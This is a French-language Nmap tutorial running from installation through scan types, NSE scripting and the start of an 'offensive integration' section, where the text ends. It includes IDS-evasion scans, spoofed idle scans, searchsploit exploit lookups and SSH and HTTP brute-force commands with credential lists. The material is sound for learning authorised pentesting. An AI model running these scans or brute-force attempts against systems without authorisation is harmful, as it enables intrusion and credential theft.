# Nmap – De zéro à expert by Roadmvn

## Sommaire

- [1. Introduction](#1-introduction)
- [2. Installation & mise à jour](#2-installation--mise-à-jour)
  - [Linux](#linux)
  - [Windows](#windows)
  - [macOS](#macos)
  - [Installation via Snap](#installation-via-snap-multi-plateforme)
  - [Compilation depuis les sources](#compilation-depuis-les-sources)
- [3. Syntaxe de base décomposée](#3-syntaxe-de-base-décomposée)
  - [Éléments de la syntaxe](#éléments-de-la-syntaxe)
  - [Exemples de commandes de base](#exemples-de-commandes-de-base)
  - [Vérification de l'installation et aide](#vérification-de-linstallation-et-aide)
- [4. Types de scans](#4-types-de-scans)
- [5. Options essentielles](#5-options-essentielles)
- [6. Formats de sortie](#6-formats-de-sortie)
- [7. NSE (Nmap Scripting Engine)](#7-nse-nmap-scripting-engine)
- [8. Intégration offensive](#8-intégration-offensive)
- [9. OPSEC & Évasion avancée](#9-opsec--évasion-avancée)
- [10. Automatisation & tuning](#10-automatisation--tuning)
- [11. Troubleshooting & erreurs courantes](#11-troubleshooting--erreurs-courantes)
- [12. ⚡ Quick Ops](#12--quick-ops)
- [13. Mini-lab guidé : De Nmap à Metasploit (VSFTPD)](#13-mini-lab-guidé--de-nmap-à-metasploit-vsftpd)
- [14. Glossaire local](#14-glossaire-local)
- [15. Quiz final](#15-quiz-final)

## 1. Introduction

Nmap (Network Mapper) est l'outil de reconnaissance réseau le plus utilisé en cybersécurité. Créé en 1997 par Gordon Lyon (Fyodor), il permet de découvrir les hôtes, services et vulnérabilités d'un réseau en envoyant des paquets spécialisés et en analysant les réponses.

**En clair, pour un débutant :** Nmap est comme un scanner qui révèle quels ordinateurs sont connectés à un réseau et quelles "portes" (ports) sont ouvertes sur ces machines.

## 2. Installation & mise à jour

### Linux

#### Debian/Ubuntu
```bash
# Installation
sudo apt update
sudo apt install nmap

# Mise à jour
sudo apt update
sudo apt upgrade nmap
```

#### Fedora/RHEL/CentOS
```bash
# Installation
sudo dnf install nmap

# Mise à jour
sudo dnf update nmap
```

#### Arch Linux
```bash
# Installation
sudo pacman -S nmap

# Mise à jour
sudo pacman -Syu
```

### Windows

#### Installation via l'exécutable
1. Téléchargez l'installateur depuis [nmap.org/download.html](https://nmap.org/download.html)
2. Exécutez le fichier `.exe` téléchargé
3. Suivez les instructions d'installation
4. Cochez l'option "Add Nmap to PATH" pour faciliter l'utilisation en ligne de commande

#### Mise à jour Windows
Téléchargez et installez la nouvelle version depuis le site officiel, l'ancienne sera automatiquement remplacée.

### macOS

#### Via Homebrew
```bash
# Installation
brew install nmap

# Mise à jour
brew update
brew upgrade nmap
```

#### Via MacPorts
```bash
# Installation
sudo port install nmap

# Mise à jour
sudo port selfupdate
sudo port upgrade nmap
```

### Installation via Snap (multi-plateforme)
```bash
# Installation
sudo snap install nmap

# Mise à jour
sudo snap refresh nmap
```

### Compilation depuis les sources
```bash
# Prérequis
sudo apt install build-essential libpcap-dev libssl-dev

# Téléchargement et extraction
wget https://nmap.org/dist/nmap-7.94.tar.bz2
tar -xjf nmap-7.94.tar.bz2
cd nmap-7.94

# Compilation et installation
./configure
make
sudo make install

# Vérification
nmap --version
```

**En clair, pour un débutant :** Pour installer Nmap, utilisez le gestionnaire de paquets de votre système (apt, dnf, brew) ou téléchargez l'installateur depuis le site officiel. La compilation depuis les sources est utile pour avoir la dernière version, mais plus complexe.

## 3. Syntaxe de base décomposée

La syntaxe fondamentale de Nmap suit ce modèle :

```
nmap [options] <cible>
```

### Éléments de la syntaxe

#### Cibles
Les cibles peuvent être spécifiées de plusieurs façons :

```bash
# Adresse IP unique
nmap 192.168.1.1

# Nom d'hôte
nmap example.com

# Plage d'adresses IP
nmap 192.168.1.1-10

# Sous-réseau CIDR
nmap 192.168.1.0/24

# Plusieurs cibles
nmap 192.168.1.1 192.168.1.2 example.com

# Liste de cibles depuis un fichier
nmap -iL cibles.txt
```

#### Options
Les options modifient le comportement du scan :

```bash
# Options de découverte d'hôtes
-Pn                # Ignore la découverte d'hôtes, considère toutes les cibles comme actives
-sn                # Scan ping uniquement (pas de scan de port)

# Options de scan de ports
-p 80,443          # Scan uniquement les ports 80 et 443
-p 1-1000          # Scan les ports 1 à 1000
-p-                # Scan tous les ports (1-65535)
-F                 # Scan rapide (ports les plus courants)

# Options de détection de version
-sV                # Détection de version des services
-A                 # Mode agressif (OS, version, scripts, traceroute)

# Options de temporisation
-T4                # Vitesse de scan (0-5, 0=lent, 5=rapide)
```

### Exemples de commandes de base

```bash
# Scan simple d'un hôte
nmap 192.168.1.1

# Scan d'un sous-réseau entier
nmap 192.168.1.0/24

# Scan des 1000 ports les plus courants
nmap example.com

# Scan complet avec détection de version
nmap -sV -p- 192.168.1.1

# Scan rapide d'un réseau
nmap -F 10.0.0.0/24

# Scan agressif d'un hôte spécifique
nmap -A 192.168.1.100
```

### Vérification de l'installation et aide

```bash
# Vérifier la version installée
nmap --version

# Afficher l'aide complète
nmap -h

# Afficher le manuel détaillé
man nmap
```

**En clair, pour un débutant :** La commande Nmap fonctionne comme "nmap [options] cible". La cible peut être une adresse IP, un nom de site, ou tout un réseau. Les options sont des "drapeaux" qui commencent par un tiret et indiquent à Nmap comment scanner (quels ports, quelle vitesse, etc.).

## 4. Types de scans

Nmap propose différentes techniques de scan, chacune avec ses avantages et inconvénients. Ces techniques diffèrent par les paquets TCP/IP envoyés et la façon d'interpréter les réponses.

### TCP SYN Scan (`-sS`)

C'est le scan par défaut lorsqu'exécuté en tant que root/administrateur. Rapide et discret, il n'établit jamais de connexion complète.

```
# Diagramme du TCP SYN Scan
                    
  CLIENT (NMAP)           SERVEUR
       |                     |
       |------ SYN --------->|  # Nmap envoie un paquet SYN
       |                     |
       |                     |  # Si port ouvert:
       |<---- SYN/ACK -------|  # Le serveur répond SYN/ACK
       |                     |
       |------ RST --------->|  # Nmap envoie RST (pas de connexion complète)
       |                     |
                   OU
       |                     |  # Si port fermé:
       |<------ RST ---------|  # Le serveur répond RST
       |                     |
                   OU
       |                     |  # Si filtré:
       |                     |  # Pas de réponse ou ICMP unreachable
       |                     |
```

```bash
# Exemple de commande
sudo nmap -sS 192.168.1.1
```

### TCP Connect Scan (`-sT`)

Scan par défaut pour les utilisateurs sans privilèges. Établit une connexion complète, plus lent et plus facilement détectable.

```
# Diagramme du TCP Connect Scan
                    
  CLIENT (NMAP)           SERVEUR
       |                     |
       |------ SYN --------->|  # Nmap envoie un paquet SYN
       |                     |
       |                     |  # Si port ouvert:
       |<---- SYN/ACK -------|  # Le serveur répond SYN/ACK
       |                     |
       |------ ACK --------->|  # Nmap complète la connexion avec ACK
       |                     |
       |------ RST --------->|  # Puis ferme la connexion avec RST
       |                     |
                   OU
       |                     |  # Si port fermé:
       |<------ RST ---------|  # Le serveur répond RST
       |                     |
```

```bash
# Exemple de commande
nmap -sT 192.168.1.1
```

### UDP Scan (`-sU`)

Scan des ports UDP, souvent négligés mais critiques pour la sécurité. Plus lent que les scans TCP.

```
# Diagramme du UDP Scan
                    
  CLIENT (NMAP)           SERVEUR
       |                     |
       |------ UDP --------->|  # Nmap envoie un paquet UDP
       |                     |
       |                     |  # Si port ouvert:
       |                     |  # Pas de réponse (généralement)
       |                     |  # Ou réponse UDP spécifique au service
       |                     |
                   OU
       |                     |  # Si port fermé:
       |<-- ICMP Port Unr. --|  # ICMP "Port Unreachable"
       |                     |
```

```bash
# Exemple de commande
sudo nmap -sU 192.168.1.1
```

### TCP ACK Scan (`-sA`)

Utilisé principalement pour déterminer les règles de pare-feu, pas pour déterminer si les ports sont ouverts ou fermés.

```
# Diagramme du TCP ACK Scan
                    
  CLIENT (NMAP)           SERVEUR
       |                     |
       |------ ACK --------->|  # Nmap envoie un paquet ACK
       |                     |
       |                     |  # Si non filtré:
       |<------ RST ---------|  # Le serveur répond RST
       |                     |
                   OU
       |                     |  # Si filtré:
       |                     |  # Pas de réponse ou ICMP unreachable
       |                     |
```

```bash
# Exemple de commande
sudo nmap -sA 192.168.1.1
```

### TCP FIN Scan (`-sF`)

Scan furtif qui envoie un paquet avec le flag FIN activé. Utile pour contourner certains pare-feu.

```
# Diagramme du TCP FIN Scan
                    
  CLIENT (NMAP)           SERVEUR
       |                     |
       |------ FIN --------->|  # Nmap envoie un paquet FIN
       |                     |
       |                     |  # Si port ouvert:
       |                     |  # Pas de réponse (selon RFC)
       |                     |
                   OU
       |                     |  # Si port fermé:
       |<------ RST ---------|  # Le serveur répond RST
       |                     |
```

```bash
# Exemple de commande
sudo nmap -sF 192.168.1.1
```

### TCP Xmas Scan (`-sX`)

Scan furtif qui envoie un paquet avec les flags FIN, PSH et URG activés. Le paquet est "décoré" comme un arbre de Noël.

```
# Diagramme du TCP Xmas Scan
                    
  CLIENT (NMAP)           SERVEUR
       |                     |
       |--- FIN+PSH+URG ---->|  # Nmap envoie un paquet avec FIN, PSH et URG
       |                     |
       |                     |  # Si port ouvert:
       |                     |  # Pas de réponse (selon RFC)
       |                     |
                   OU
       |                     |  # Si port fermé:
       |<------ RST ---------|  # Le serveur répond RST
       |                     |
```

```bash
# Exemple de commande
sudo nmap -sX 192.168.1.1
```

### Idle Scan (`-sI`)

Scan extrêmement furtif qui utilise un hôte zombie pour effectuer le scan. Ne révèle pas l'adresse IP de l'attaquant.

```
# Diagramme du Idle Scan
                    
  CLIENT (NMAP)     ZOMBIE      CIBLE
       |               |          |
       |-- Probe IPID->|          |  # Nmap vérifie l'IPID initial du zombie
       |<-- RST+IPID --|          |
       |               |          |
       |               |          |  # Pour chaque port à scanner:
       |-- Spoofed SYN ---------->|  # Nmap envoie SYN en se faisant passer pour le zombie
       |               |          |
       |               |          |  # Si port ouvert:
       |               |<- SYN/ACK-|  # La cible répond SYN/ACK au zombie
       |               |          |
       |               |-- RST -->|  # Le zombie répond RST (IPID incrémenté)
       |               |          |
       |               |          |  # Si port fermé:
       |               |<--- RST -|  # La cible répond RST au zombie (IPID inchangé)
       |               |          |
       |-- Probe IPID->|          |  # Nmap vérifie le nouvel IPID du zombie
       |<-- RST+IPID --|          |  # Si IPID+1, port ouvert; si IPID+2, port fermé
       |               |          |
```

```bash
# Exemple de commande
sudo nmap -sI zombie_host 192.168.1.1
```

**En clair, pour un débutant :** Les types de scans sont différentes façons de "frapper à la porte" des ordinateurs cibles. Le scan SYN est comme frapper et partir dès qu'on entend du bruit (discret). Le scan Connect est comme frapper, attendre que quelqu'un ouvre, puis partir (détectable). Les scans furtifs (FIN, Xmas) utilisent des techniques spéciales pour éviter d'être repérés par les pare-feu. Le scan Idle est comme envoyer quelqu'un d'autre frapper à votre place pour rester anonyme.

## 5. Options essentielles

Nmap dispose de nombreuses options qui permettent d'affiner les scans et d'obtenir des informations plus détaillées sur les cibles.

### Détection de version (`-sV`)

Cette option tente d'identifier la version des services détectés sur les ports ouverts.

```bash
# Détection de version basique
nmap -sV 192.168.1.1

# Détection de version avec intensité (0-9)
nmap -sV --version-intensity 7 192.168.1.1

# Détection de version avec tous les tests (lent mais complet)
nmap -sV --version-all 192.168.1.1
```

Exemple de sortie :
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### Détection de système d'exploitation (`-O`)

Tente d'identifier le système d'exploitation de la cible en analysant les réponses aux paquets envoyés.

```bash
# Détection de système d'exploitation
sudo nmap -O 192.168.1.1

# Détection de système d'exploitation avec plus de détails
sudo nmap -O --osscan-guess 192.168.1.1
```

Exemple de sortie :
```
OS details: Linux 5.4 - 5.6
OS CPE: cpe:/o:linux:linux_kernel:5.4
```

### Exécution de scripts NSE (`-sC`)

Lance les scripts NSE (Nmap Scripting Engine) de la catégorie "default".

```bash
# Exécution des scripts par défaut
nmap -sC 192.168.1.1

# Exécution de scripts spécifiques
nmap --script=http-title,http-headers 192.168.1.1

# Exécution de scripts par catégorie
nmap --script=vuln 192.168.1.1
```

Exemple de sortie :
```
PORT   STATE SERVICE
80/tcp open  http
| http-title: Example Domain
|_Requested resource was http://example.com/
```

### Mode agressif (`-A`)

Combine plusieurs options pour obtenir un maximum d'informations : détection de version (`-sV`), détection de système d'exploitation (`-O`), scripts par défaut (`-sC`) et traceroute.

```bash
# Scan agressif
sudo nmap -A 192.168.1.1
```

### Options de temporisation (`-T0` à `-T5`)

Contrôle la vitesse du scan, de très lent (`-T0`) à très rapide (`-T5`).

```bash
# Scan furtif (très lent)
nmap -T0 192.168.1.1

# Scan poli (lent)
nmap -T1 192.168.1.1

# Scan normal (par défaut)
nmap -T3 192.168.1.1

# Scan agressif (rapide)
nmap -T4 192.168.1.1

# Scan insane (très rapide, peut manquer des ports)
nmap -T5 192.168.1.1
```

Tableau comparatif des temporisations :

| Niveau | Nom | Description | Utilisation |
|--------|-----|-------------|-------------|
| T0 | Paranoïaque | Extrêmement lent, attend 5 minutes entre chaque sonde | Éviter la détection IDS |
| T1 | Furtif | Très lent, attend 15 secondes entre chaque sonde | Utilisation discrète |
| T2 | Poli | Lent, attend 0.4 secondes entre chaque sonde | Utilisation peu intrusive |
| T3 | Normal | Vitesse par défaut | Usage quotidien |
| T4 | Agressif | Rapide, attend 10ms entre chaque sonde | Réseaux fiables |
| T5 | Insane | Très rapide, peut manquer des ports | Tests rapides uniquement |

### Scan de tous les ports (`-p-`)

Par défaut, Nmap scanne uniquement les 1000 ports les plus courants. Cette option permet de scanner tous les ports (1-65535).

```bash
# Scan de tous les ports
nmap -p- 192.168.1.1

# Scan de ports spécifiques
nmap -p 22,80,443 192.168.1.1

# Scan d'une plage de ports
nmap -p 1-1024 192.168.1.1

# Scan des ports les plus courants (équivalent à -F)
nmap --top-ports 100 192.168.1.1
```

### Combinaisons d'options puissantes

```bash
# Scan complet et détaillé (lent mais très informatif)
sudo nmap -sS -sV -sC -O -p- -T4 192.168.1.1

# Scan rapide pour une première reconnaissance
nmap -F -T4 192.168.1.0/24

# Scan UDP des services courants
sudo nmap -sU -sV --top-ports 20 192.168.1.1

# Scan furtif pour éviter la détection
sudo nmap -sS -T1 -f --data-length 200 --randomize-hosts 192.168.1.0/24
```

**En clair, pour un débutant :** Les options essentielles permettent d'obtenir plus d'informations sur votre cible. `-sV` identifie les logiciels qui tournent sur chaque port, `-O` devine le système d'exploitation, `-sC` lance des mini-programmes pour tester la sécurité, `-A` fait tout ça en même temps. Les options `-T0` à `-T5` contrôlent la vitesse (comme une voiture : mode éco à sport). L'option `-p-` vérifie toutes les portes possibles, pas seulement les plus courantes.

## 6. Formats de sortie

Nmap peut générer des rapports dans différents formats, ce qui facilite l'analyse, le traitement et l'intégration avec d'autres outils.

### Format normal (`-oN`)

C'est le format de sortie par défaut, lisible par un humain. Il est identique à ce qui s'affiche dans le terminal.

```bash
# Enregistrer la sortie au format normal
nmap -sV 192.168.1.1 -oN scan_normal.txt
```

Exemple de sortie :
```
# Nmap 7.94 scan initiated Thu May 29 22:35:40 2025 as: nmap -sV -oN scan_normal.txt 192.168.1.1
Nmap scan report for 192.168.1.1
Host is up (0.0054s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 29 22:35:52 2025 -- 1 IP address (1 host up) scanned in 12.31 seconds
```

### Format XML (`-oX`)

Format structuré idéal pour le traitement automatisé et l'intégration avec d'autres outils.

```bash
# Enregistrer la sortie au format XML
nmap -sV 192.168.1.1 -oX scan_xml.xml
```

Exemple de sortie (extrait) :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<nmaprun scanner="nmap" args="nmap -sV -oX scan_xml.xml 192.168.1.1" start="1716939340" startstr="Thu May 29 22:35:40 2025" version="7.94">
  <scaninfo type="syn" protocol="tcp" numservices="1000" services="1,3-4,6-7,..."/>
  <verbose level="0"/>
  <debugging level="0"/>
  <host starttime="1716939340" endtime="1716939352">
    <status state="up" reason="echo-reply" reason_ttl="64"/>
    <address addr="192.168.1.1" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="22">
        <state state="open" reason="syn-ack" reason_ttl="64"/>
        <service name="ssh" product="OpenSSH" version="8.2p1 Ubuntu 4ubuntu0.5" extrainfo="Ubuntu Linux; protocol 2.0" ostype="Linux" method="probed" conf="10"/>
      </port>
      <port protocol="tcp" portid="80">
        <state state="open" reason="syn-ack" reason_ttl="64"/>
        <service name="http" product="Apache httpd" version="2.4.41" extrainfo="(Ubuntu)" method="probed" conf="10"/>
      </port>
    </ports>
  </host>
  <runstats>
    <finished time="1716939352" timestr="Thu May 29 22:35:52 2025" elapsed="12.31" summary="Nmap done at Thu May 29 22:35:52 2025; 1 IP address (1 host up) scanned in 12.31 seconds" exit="success"/>
    <hosts up="1" down="0" total="1"/>
  </runstats>
</nmaprun>
```

### Format Grepable (`-oG`)

Format conçu pour être facilement filtré avec des outils comme `grep`, `awk` ou `cut`.

```bash
# Enregistrer la sortie au format grepable
nmap -sV 192.168.1.1 -oG scan_grep.txt
```

Exemple de sortie :
```
# Nmap 7.94 scan initiated Thu May 29 22:35:40 2025 as: nmap -sV -oG scan_grep.txt 192.168.1.1
Host: 192.168.1.1 ()	Status: Up
Host: 192.168.1.1 ()	Ports: 22/open/tcp//ssh//OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)/, 80/open/tcp//http//Apache httpd 2.4.41 ((Ubuntu))/	Ignored State: closed (998)
# Nmap done at Thu May 29 22:35:52 2025 -- 1 IP address (1 host up) scanned in 12.31 seconds
```

### Format JSON (`-oJ`)

Format JSON pour l'intégration avec des applications web et des scripts modernes.

```bash
# Enregistrer la sortie au format JSON
nmap -sV 192.168.1.1 -oJ scan_json.json
```

Exemple de sortie (extrait) :
```json
{
  "nmaprun": {
    "scanner": "nmap",
    "args": "nmap -sV -oJ scan_json.json 192.168.1.1",
    "start": "1716939340",
    "startstr": "Thu May 29 22:35:40 2025",
    "version": "7.94",
    "host": {
      "starttime": "1716939340",
      "endtime": "1716939352",
      "status": {
        "state": "up",
        "reason": "echo-reply",
        "reason_ttl": "64"
      },
      "address": {
        "addr": "192.168.1.1",
        "addrtype": "ipv4"
      },
      "ports": {
        "port": [
          {
            "protocol": "tcp",
            "portid": "22",
            "state": {
              "state": "open",
              "reason": "syn-ack",
              "reason_ttl": "64"
            },
            "service": {
              "name": "ssh",
              "product": "OpenSSH",
              "version": "8.2p1 Ubuntu 4ubuntu0.5",
              "extrainfo": "Ubuntu Linux; protocol 2.0",
              "ostype": "Linux",
              "method": "probed",
              "conf": "10"
            }
          },
          {
            "protocol": "tcp",
            "portid": "80",
            "state": {
              "state": "open",
              "reason": "syn-ack",
              "reason_ttl": "64"
            },
            "service": {
              "name": "http",
              "product": "Apache httpd",
              "version": "2.4.41",
              "extrainfo": "(Ubuntu)",
              "method": "probed",
              "conf": "10"
            }
          }
        ]
      }
    }
  }
}
```

### Tous les formats à la fois (`-oA`)

Génère les trois formats principaux (normal, XML et grepable) en une seule commande.

```bash
# Enregistrer la sortie dans tous les formats
nmap -sV 192.168.1.1 -oA scan_complet
```

Cette commande génère trois fichiers : `scan_complet.nmap` (normal), `scan_complet.xml` (XML) et `scan_complet.gnmap` (grepable).

### Intégration avec d'autres outils

#### Searchsploit

Searchsploit est un outil qui permet de rechercher des exploits dans la base de données Exploit-DB. Il peut être directement intégré avec Nmap.

```bash
# Scan avec Nmap et recherche d'exploits
nmap -sV 192.168.1.1 -oX scan.xml
searchsploit --nmap scan.xml
```

Exemple de sortie :
```
[*] Processing Nmap XML file 'scan.xml'
[*] Found 2 services...
 
 Exploits for Apache httpd 2.4.41
 --------------------------------
  | Title                                                                                | Path
  | Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)             | multiple/webapps/50383.py
  | Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)             | multiple/webapps/50512.py
 
 Exploits for OpenSSH 8.2p1
 -------------------------
  | Title                                                                                | Path
  | OpenSSH 8.2p1 - Username Enumeration                                                 | linux/remote/46459.py
```

#### XSLTPROC

XSLTPROC permet de transformer un fichier XML en HTML pour une visualisation plus agréable.

```bash
# Scan avec Nmap et conversion en HTML
nmap -sV 192.168.1.1 -oX scan.xml
xsltproc scan.xml -o scan.html
```

Vous pouvez également utiliser les feuilles de style intégrées à Nmap :

```bash
xsltproc /usr/share/nmap/nmap.xsl scan.xml -o scan.html
```

#### Automatisation avec Python

Exemple de script Python pour analyser un fichier XML de Nmap :

```python
#!/usr/bin/env python3
import xml.etree.ElementTree as ET

# Charger le fichier XML
tree = ET.parse('scan.xml')
root = tree.getroot()

# Parcourir les hôtes et les ports
for host in root.findall('./host'):
    ip = host.find('./address').get('addr')
    print(f"Hôte: {ip}")
    
    for port in host.findall('./ports/port'):
        port_id = port.get('portid')
        protocol = port.get('protocol')
        state = port.find('./state').get('state')
        
        service_el = port.find('./service')
        if service_el is not None:
            service = service_el.get('name')
            product = service_el.get('product', '')
            version = service_el.get('version', '')
            
            print(f"  Port {port_id}/{protocol} ({state}): {service} {product} {version}")
```

**En clair, pour un débutant :** Les formats de sortie sont différentes façons d'enregistrer les résultats de vos scans. Le format normal est facile à lire pour un humain, le XML est structuré pour être traité par d'autres programmes, le format grepable est conçu pour être filtré avec des commandes comme grep, et le JSON est utilisé pour les applications web modernes. Ces formats permettent d'intégrer Nmap avec d'autres outils comme searchsploit pour trouver des vulnérabilités connues.

## 7. NSE (Nmap Scripting Engine)

Le Nmap Scripting Engine (NSE) est une des fonctionnalités les plus puissantes de Nmap. Il permet d'étendre les capacités de base de Nmap en exécutant des scripts Lua pour effectuer des tâches avancées comme la détection de vulnérabilités, l'énumération de services, ou la collecte d'informations supplémentaires.

### Structure d'un script NSE

Les scripts NSE sont écrits en Lua et suivent généralement cette structure :

```lua
description = [[
Description du script et de son fonctionnement.
]]

author = "Nom de l'auteur"
license = "Licence (généralement Same as Nmap--See https://nmap.org/book/man-legal.html)"
categories = {"catégorie1", "catégorie2"}

-- Bibliothèques requises
local shortport = require "shortport"
local http = require "http"

-- Règle de déclenchement du script
portrule = shortport.port_or_service(80, "http")

-- Fonction principale exécutée si la règle est satisfaite
action = function(host, port)
  -- Code du script
  local response = http.get(host, port, "/")
  
  -- Traitement et retour des résultats
  if response.status == 200 then
    return "Page accessible, titre: " .. response.body:match("<title>(.-)</title>")
  else
    return "Erreur: " .. response.status
  end
end
```

### Emplacement des scripts

Les scripts NSE sont généralement stockés dans le répertoire `/usr/share/nmap/scripts/` sur Linux ou `C:\Program Files (x86)\Nmap\scripts\` sur Windows.

```bash
# Lister tous les scripts disponibles
ls /usr/share/nmap/scripts/

# Compter le nombre de scripts disponibles
ls /usr/share/nmap/scripts/ | wc -l
```

### Catégories de scripts

Les scripts NSE sont organisés en catégories selon leur fonction :

| Catégorie | Description | Exemple d'utilisation |
|-----------|-------------|------------------------|
| `auth` | Authentification et contournement | `nmap --script auth 192.168.1.1` |
| `broadcast` | Découverte de réseau par broadcast | `nmap --script broadcast 192.168.1.0/24` |
| `brute` | Force brute de mots de passe | `nmap --script brute 192.168.1.1` |
| `default` | Scripts exécutés avec l'option `-sC` | `nmap -sC 192.168.1.1` |
| `discovery` | Découverte de services et d'informations | `nmap --script discovery 192.168.1.1` |
| `dos` | Détection de vulnérabilités DoS (ne lance pas d'attaque) | `nmap --script dos 192.168.1.1` |
| `exploit` | Exploitation de vulnérabilités | `nmap --script exploit 192.168.1.1` |
| `external` | Scripts utilisant des services externes | `nmap --script external 192.168.1.1` |
| `fuzzer` | Fuzzing de protocoles | `nmap --script fuzzer 192.168.1.1` |
| `intrusive` | Scripts potentiellement intrusifs | `nmap --script intrusive 192.168.1.1` |
| `malware` | Détection de malwares et backdoors | `nmap --script malware 192.168.1.1` |
| `safe` | Scripts non intrusifs | `nmap --script safe 192.168.1.1` |
| `version` | Amélioration de la détection de version | `nmap --script version 192.168.1.1` |
| `vuln` | Détection de vulnérabilités connues | `nmap --script vuln 192.168.1.1` |

### Top 10 des scripts NSE les plus utiles

1. **http-enum** : Énumère les répertoires, fichiers et applications web courantes
   ```bash
   nmap --script http-enum 192.168.1.1 -p 80
   ```

2. **ssl-enum-ciphers** : Vérifie les suites de chiffrement SSL/TLS et identifie les configurations faibles
   ```bash
   nmap --script ssl-enum-ciphers 192.168.1.1 -p 443
   ```

3. **smb-os-discovery** : Détecte le système d'exploitation via SMB
   ```bash
   nmap --script smb-os-discovery 192.168.1.1 -p 445
   ```

4. **dns-zone-transfer** : Tente un transfert de zone DNS
   ```bash
   nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=example.com -p 53 192.168.1.1
   ```

5. **ssh-auth-methods** : Énumère les méthodes d'authentification SSH disponibles
   ```bash
   nmap --script ssh-auth-methods 192.168.1.1 -p 22
   ```

6. **http-title** : Récupère le titre des pages web
   ```bash
   nmap --script http-title 192.168.1.0/24 -p 80,443
   ```

7. **vulners** : Vérifie les vulnérabilités connues basées sur les versions des services
   ```bash
   nmap --script vulners 192.168.1.1
   ```

8. **ftp-anon** : Vérifie si l'accès FTP anonyme est autorisé
   ```bash
   nmap --script ftp-anon 192.168.1.1 -p 21
   ```

9. **mysql-empty-password** : Vérifie les comptes MySQL sans mot de passe
   ```bash
   nmap --script mysql-empty-password 192.168.1.1 -p 3306
   ```

10. **banner** : Récupère les bannières des services
    ```bash
    nmap --script banner 192.168.1.1 -p 21,22,25,80
    ```

### Utilisation de `--script`

L'option `--script` permet de spécifier quels scripts exécuter :

```bash
# Exécuter un script spécifique
nmap --script http-title 192.168.1.1 -p 80

# Exécuter plusieurs scripts
nmap --script "http-title,http-headers" 192.168.1.1 -p 80

# Exécuter tous les scripts d'une catégorie
nmap --script vuln 192.168.1.1

# Utiliser des jokers pour sélectionner des scripts
nmap --script "http-*" 192.168.1.1 -p 80

# Combiner des catégories et des scripts spécifiques
nmap --script "default,safe,http-enum" 192.168.1.1

# Exclure certains scripts
nmap --script "default,safe,!http-enum" 192.168.1.1
```

### Utilisation de `--script-args`

L'option `--script-args` permet de passer des arguments aux scripts :

```bash
# Passer un argument à un script
nmap --script http-brute --script-args http-brute.path=/admin/ 192.168.1.1 -p 80

# Passer plusieurs arguments
nmap --script http-brute --script-args "http-brute.path=/admin/,http-brute.method=POST" 192.168.1.1 -p 80

# Passer des arguments à plusieurs scripts
nmap --script "http-brute,http-form-brute" --script-args "userdb=users.txt,passdb=passwords.txt" 192.168.1.1 -p 80

# Modifier l'user-agent HTTP
nmap --script http-headers --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 192.168.1.1 -p 80
```

### Mise à jour de la base de scripts

```bash
# Mettre à jour tous les scripts NSE
sudo nmap --script-updatedb
```

### Exemples d'utilisation avancée

#### Détection de vulnérabilités

```bash
# Recherche de vulnérabilités sur un serveur web
nmap --script "vuln,http-vuln*" 192.168.1.1 -p 80,443

# Recherche de vulnérabilités sur tous les services
nmap -sV --script vuln 192.168.1.1
```

#### Énumération d'informations

```bash
# Énumération complète d'un serveur web
nmap --script "http-enum,http-headers,http-methods,http-title" 192.168.1.1 -p 80

# Énumération SMB
nmap --script "smb-enum-*,smb-os-discovery" 192.168.1.1 -p 139,445
```

#### Brute force

```bash
# Brute force SSH
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.1 -p 22

# Brute force HTTP Basic Auth
nmap --script http-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.1 -p 80
```

#### Création d'un script NSE simple

Voici un exemple de script NSE simple qui vérifie si un serveur web est en ligne et récupère son titre :

```lua
-- Fichier: check-web.nse
description = [[
Vérifie si un serveur web est en ligne et récupère son titre.
]]

author = "Votre Nom"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "safe"}

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"

portrule = shortport.port_or_service({80, 443}, {"http", "https"})

action = function(host, port)
  local response = http.get(host, port, "/")
  
  if not response or response.status == nil then
    return "Serveur web non accessible"
  end
  
  local title = response.body and response.body:match("<title>(.-)</title>")
  
  if response.status == 200 then
    if title then
      return string.format("Serveur web en ligne (HTTP %d) - Titre: %s", response.status, title)
    else
      return string.format("Serveur web en ligne (HTTP %d) - Pas de titre", response.status)
    end
  else
    return string.format("Serveur web répond avec code HTTP %d", response.status)
  end
end
```

Pour utiliser ce script :

```bash
# Copier le script dans le répertoire des scripts NSE
sudo cp check-web.nse /usr/share/nmap/scripts/

# Mettre à jour la base de données de scripts
sudo nmap --script-updatedb

# Exécuter le script
nmap --script check-web 192.168.1.1 -p 80,443
```

**En clair, pour un débutant :** Le NSE (Nmap Scripting Engine) est comme une boîte à outils d'extensions pour Nmap. Ces "mini-programmes" permettent de faire bien plus que simplement scanner des ports : ils peuvent tester des vulnérabilités, récupérer des informations détaillées sur les services, ou même tenter de deviner des mots de passe. Pour les utiliser, ajoutez simplement `--script nom_du_script` à votre commande Nmap. Les scripts sont classés par catégories (comme "vuln" pour les vulnérabilités ou "safe" pour les tests non intrusifs) et peuvent recevoir des paramètres avec `--script-args`.

## 8. Intégration offensive

Nmap est souvent le premier outil utilisé dans une chaîne d'attaque. Cette section explique comment intégrer Nmap avec d'autres outils offensifs pour créer un workflow complet de pentesting.

### Import direct dans Metasploit : `db_nmap`

Metasploit Framework est une plateforme d'exploitation qui peut directement importer les résultats de Nmap pour faciliter les attaques ciblées.

